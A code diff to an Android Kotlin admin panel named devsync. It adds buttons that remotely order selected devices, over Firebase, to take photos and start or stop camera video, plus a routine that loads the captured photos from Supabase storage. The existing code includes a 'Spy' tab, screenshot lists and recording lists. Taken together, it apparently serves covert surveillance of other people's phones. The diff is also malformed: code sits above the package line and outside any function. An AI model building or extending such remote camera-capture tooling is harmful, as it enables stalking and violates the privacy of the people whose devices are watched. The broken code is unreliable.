@@ -1,4 +1,25 @@
-package com.example.devsync
+
+          btnTakePhoto.setOnClickListener {
+              selectedIds.forEach { id ->
+                  FirebaseDatabase.getInstance(DB_URL).getReference("devices/$id/take_photo").setValue(true)
+              }
+              tvFeedback.text = "📸 Take Photo command sent to ${selectedIds.size} device(s)"
+          }
+
+          btnStartCameraVideo.setOnClickListener {
+              selectedIds.forEach { id ->
+                  FirebaseDatabase.getInstance(DB_URL).getReference("devices/$id/camera_video_flag").setValue(true)
+              }
+              tvFeedback.text = "🎥 Camera Video START sent to ${selectedIds.size} device(s)"
+          }
+
+          btnStopCameraVideo.setOnClickListener {
+              selectedIds.forEach { id ->
+                  FirebaseDatabase.getInstance(DB_URL).getReference("devices/$id/camera_video_flag").setValue(false)
+              }
+              tvFeedback.text = "⏹ Camera Video STOP sent to ${selectedIds.size} device(s)"
+          }
+  package com.example.devsync
 
 import android.Manifest
 import android.content.pm.PackageManager
@@ -60,6 +81,10 @@ class AdminControlActivity : AppCompatActivity() {
     private lateinit var rvRecordings: RecyclerView
     private lateinit var rvSongs: RecyclerView
     private lateinit var rvWallpapers: RecyclerView
+      private lateinit var rvPhotos: RecyclerView
+      private lateinit var btnTakePhoto: Button
+      private lateinit var btnStartCameraVideo: Button
+      private lateinit var btnStopCameraVideo: Button
     private lateinit var tabSpy: Button
     private lateinit var tabMedia: Button
     private lateinit var tabControls: Button
@@ -75,6 +100,7 @@ class AdminControlActivity : AppCompatActivity() {
     private val recordingList  = mutableListOf<RecordingItem>()
     private val songList       = mutableListOf<MediaItem>()
     private val wallpaperList  = mutableListOf<MediaItem>()
+      private val photoList      = mutableListOf<ScreenshotItem>()
 
     private lateinit var deviceAdapter: DeviceListAdapter
     private lateinit var screenshotAdapter: ScreenshotListAdapter
@@ -82,6 +108,7 @@ class AdminControlActivity : AppCompatActivity() {
     private lateinit var recordingAdapter: RecordingListAdapter
     private lateinit var songAdapter: MediaListAdapter
     private lateinit var wallpaperAdapter: MediaListAdapter
+      private lateinit var photoAdapter: ScreenshotListAdapter
 
     // ── Supabase HTTP client ──────────────────────────────────────────────────
     private val http = OkHttpClient.Builder()
@@ -131,6 +158,7 @@ class AdminControlActivity : AppCompatActivity() {
             try { count += loadScreenshotsFromSupabase() } catch (_: Exception) {}
             try { count += loadRecordingsFromSupabase() } catch (_: Exception) {}
             try { count += loadVideosFromSupabase() }      catch (_: Exception) {}
+              try { count += loadPhotosFromSupabase() }       catch (_: Exception) {}
             withContext(Dispatchers.Main) {
                 tvFeedback.text = "✅ Loaded $count items from Supabase"
             }
@@ -224,6 +252,27 @@ class AdminControlActivity : AppCompatActivity() {
         return list.size
     }
 
+      private suspend fun loadPhotosFromSupabase(): Int {
+          val arr  = supabaseList("photos")
+          val list = mutableListOf<ScreenshotItem>()
+          for (i in 0 until arr.length()) {
+              try {
+                  val obj  = arr.getJSONObject(i)
+                  val name = obj.optString("name") ?: continue
+                  if (!name.endsWith(".jpg") && !name.endsWith(".jpeg")) continue
+                  val noExt = name.removeSuffix(".jpg").removeSuffix(".jpeg")
+                  val lastUnder = noExt.lastIndexOf('_')
+                  val ts  = if (lastUnder >= 0) noExt.substring(lastUnder + 1).toLongOrNull() ?: 0L else 0L
+                  val did = if (lastUnder >= 0) noExt.substring(0, lastUnder) else noExt
+                  val url = "$SUPABASE_URL/storage/v1/object/public/photos/$name"
+                  list.add(ScreenshotItem(name, did, url, ts))
+              } catch (_: Exception) {}
+          }
+          list.sortByDescending { it.timestamp }
+          withContext(Dispatchers.Main) { photoAdapter.updateItems(list) }
+          return list.size
+      }
+  
     // ── Permissions ───────────────────────────────────────────────────────────
 
     private fun requestRequiredPermissions() {
@@ -263,6 +312,10 @@ class AdminControlActivity : AppCompatActivity() {
         rvRecordings        = findViewById(R.id.rvRecordings)
         rvSongs             = findViewById(R.id.rvSongs)
         rvWallpapers        = findViewById(R.id.rvWallpapers)
+          rvPhotos            = findViewById(R.id.rvPhotos)
+          btnTakePhoto        = findViewById(R.id.btnTakePhoto)
+          btnStartCameraVideo = findViewById(R.id.btnStartCameraVideo)
+          btnStopCameraVideo  = findViewById(R.id.btnStopCameraVideo)
         tabSpy              = findViewById(R.id.tabSpy)
         tabMedia            = findViewById(R.id.tabMedia)
         tabControls         = findViewById(R.id.tabControls)
@@ -317,6 +370,10 @@ class AdminControlActivity : AppCompatActivity() {
         )
         rvWallpapers.layoutManager = LinearLayoutManager(this); rvWallpapers.adapter = wallpaperAdapter
     }
+
+          photoAdapter = ScreenshotListAdapter(photoList)
+          rvPhotos.layoutManager = LinearLayoutManager(this)
+          rvPhotos.adapter = photoAdapter
 
     private fun db(path: String) = FirebaseDatabase.getInstance(DB_URL).getReference(path)
 
